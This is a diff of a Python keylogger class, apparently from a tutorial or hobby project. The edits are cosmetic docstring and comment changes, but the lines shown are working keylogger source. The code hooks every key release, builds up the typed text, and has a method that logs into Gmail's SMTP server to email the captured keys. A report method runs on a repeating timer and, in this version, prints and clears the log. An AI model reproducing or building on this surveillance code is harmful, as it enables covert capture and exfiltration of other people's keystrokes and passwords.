@@ -10,14 +10,10 @@ class Keylogger:
         self.semaphore = Semaphore(0)
 
     def callback(self, event):
-        """
-        This callback is invoked whenever a keyboard event is occured
-        (i.e when a key is released in this example)
-        """
+        """ This callback is invoked when a key is released """
         name = event.name
         if len(name) > 1:
             # not a character, special key (e.g ctrl, alt, etc.)
-            # uppercase with []
             if name == "space":
                 name = " "
             elif name == "enter":
@@ -30,6 +26,7 @@ class Keylogger:
         self.log += name
 
     def sendmail(self, email, password, message):
+        """ Send an email with the logged keys """
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
         server.starttls()
         server.login(email, password)
@@ -37,16 +34,14 @@ class Keylogger:
         server.quit()
 
     def report(self):
-        """
-        This function gets called every `self.interval`
-        It basically sends keylogs and resets `self.log` variable
-        """
+        """ Sends keylogs and resets `self.log` variable """
         if self.log:
             print(self.log)
         self.log = ""
         Timer(interval=self.interval, function=self.report).start()
 
     def start(self):
+        """ Start the keylogger """
         keyboard.on_release(callback=self.callback)
         self.report()
         self.semaphore.acquire()
